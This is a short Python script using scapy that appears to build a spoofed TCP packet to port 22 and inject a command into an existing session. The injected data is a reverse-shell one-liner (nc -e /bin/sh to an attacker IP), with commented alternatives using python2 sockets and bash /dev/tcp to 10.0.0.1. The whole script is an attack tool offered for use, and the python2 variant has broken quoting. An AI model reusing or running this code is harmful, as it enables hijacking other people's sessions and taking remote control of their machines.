from scapy.all import *

layer3 = IP(src='' , dst='' )
layer4 = TCP(sport= '', dport= '22', flags='', ack= '', seq='' )

#if ncat is installed in the system
data = '\n nc -e /bin/sh [AttackerIP] 1234 \n' 

#if pytthon2 is installed in the system
#data = '\n python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))' \n' 

#if bash script can be run on the system
#data = 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'

Packet = layer3/layer4/data

send(Packet, verbose=0)


